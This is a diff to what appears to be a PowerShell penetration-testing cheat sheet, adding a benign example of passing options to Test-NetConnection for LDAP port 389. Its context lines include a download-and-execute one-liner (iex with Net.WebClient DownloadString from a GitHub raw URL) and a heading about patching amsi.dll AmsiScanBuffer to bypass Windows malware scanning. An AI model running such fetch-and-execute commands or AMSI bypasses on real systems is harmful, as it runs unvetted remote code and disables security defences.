@@ -22,6 +22,17 @@ iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 ```powershell
 Test-NetConnection -Port 389 -InformationLevel "Detailed" <ip> 
 ```
+
+## Use a data structure for frequently used options
+```powershell
+$Parameters = @{
+	"Port" = "389"
+	"InformationLevel" = "Detailed"
+	"ComputerName" = "localhost"
+}
+Test-NetConnection @Parameters
+```
+
 - [Test-NetConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection)
 
 # Patching amsi.dll AmsiScanBuffer by rasta-mouse
